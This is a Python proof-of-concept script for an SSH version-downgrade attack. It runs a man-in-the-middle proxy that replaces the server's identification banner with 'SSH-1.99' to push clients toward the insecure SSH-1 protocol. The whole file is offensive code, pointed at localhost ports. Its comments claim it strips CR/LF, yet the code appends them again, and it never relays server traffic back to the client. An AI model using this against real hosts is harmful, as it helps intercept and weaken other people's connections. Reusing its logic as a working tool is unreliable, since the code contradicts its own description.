#!/usr/bin/env python3
"""
PoC for SSH Version Downgrade via Compatibility Flag Manipulation.
This script acts as a Man-in-the-Middle (MitM) proxy to intercept and modify
the SSH identification strings exchanged between client and server.

By stripping the mandatory CR/LF characters and setting the version to "1.99",
it forces the client into compatibility mode, potentially triggering an
unwanted fallback to the insecure SSH-1 protocol.
"""
import socket
import threading
import sys
import time

# Configuration
SERVER_HOST = '127.0.0.1'
SERVER_PORT = 2222  # Local SSH server listening on this port
PROXY_PORT = 2223   # This script listens here as the MitM proxy

def log(msg):
    print(f"[MITM] {msg}")

def modify_ssh_banner(banner_bytes):
    """
    Simulates the attacker modifying the server's identification string.
    According to RFC 4253 Section 5.1, a server in compatibility mode
    SHOULD identify its 'protoversion' as "1.99" and SHOULD NOT send CR/LF.
    """
    # Decode banner (handle potential encoding issues)
    try:
        banner_str = banner_bytes.decode('utf-8', errors='ignore')
    except Exception:
        return banner_bytes

    # Check if it's a valid SSH banner
    if not banner_str.startswith("SSH-"):
        return banner_bytes

    log(f"Original Banner: {repr(banner_str)}")

    # Step 1: Strip CR and LF characters (if present)
    clean_banner = banner_str.replace('\r', '').replace('\n', '')
    
    # Step 2: Force version to "1.99" to trigger compatibility mode
    # Format: SSH-protoversion-softwareversion [comments]
    modified_banner = f"SSH-1.99-MITM_Downgrade_PoC\r\n"
    
    log(f"Modified Banner: {repr(modified_banner)}")
    return modified_banner.encode('utf-8')

def handle_client(client_socket, server_addr):
    """
    Handles the connection from the client.
    Intercepts the banner sent by the server and modifies it before sending to client.
    Also intercepts client's response if needed (though PoC focuses on server->client).
    """
    log(f"Client connected: {client_socket.getpeername()}")
    
    # Connect to the actual SSH server
    try:
        server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_sock.connect(server_addr)
        log("Connected to real SSH server.")
        
        # 1. Receive banner from real server
        server_banner = b""
        while not server_banner.endswith(b'\r\n'):
            chunk = server_sock.recv(4096)
            if not chunk:
                break
            server_banner += chunk
            
        # 2. Modify the banner (The Attack)
        modified_banner = modify_ssh_banner(server_banner)
        
        # 3. Send modified banner to client
        client_socket.sendall(modified_banner)
        log("Sent modified banner to client.")
        
        # 4. Receive client's response (to observe if it triggers SSH-1 or closes)
        # In a real vulnerable setup, the client might send an SSH-1 KEX_INIT
        # or close the connection and reconnect on port 22 with Protocol 1.
        time.sleep(0.5) # Give client time to process
        
        while True:
            data = client_socket.recv(4096)
            if not data:
                break
            log(f"Client sent: {repr(data[:100])}...")
            # Forward to server (simplified, doesn't handle full bidirectional proxy perfectly for PoC brevity)
            server_sock.sendall(data)
            
    except Exception as e:
        log(f"Error handling client: {e}")
    finally:
        client_socket.close()
        if 'server_sock' in locals():
            server_sock.close()

def main():
    log("Starting SSH MitM Proxy...")
    log(f"Listening on {SERVER_HOST}:{PROXY_PORT}")
    log(f"Forwarding to {SERVER_HOST}:{SERVER_PORT}")
    
    proxy_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    proxy_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    proxy_socket.bind((SERVER_HOST, PROXY_PORT))
    proxy_socket.listen(5)
    
    try:
        while True:
            client_sock, addr = proxy_socket.accept()
            # Start a thread to handle each client
            t = threading.Thread(target=handle_client, args=(client_sock, (SERVER_HOST, SERVER_PORT)))
            t.daemon = True
            t.start()
    except KeyboardInterrupt:
        log("Shutting down.")
    finally:
        proxy_socket.close()

if __name__ == "__main__":
    main()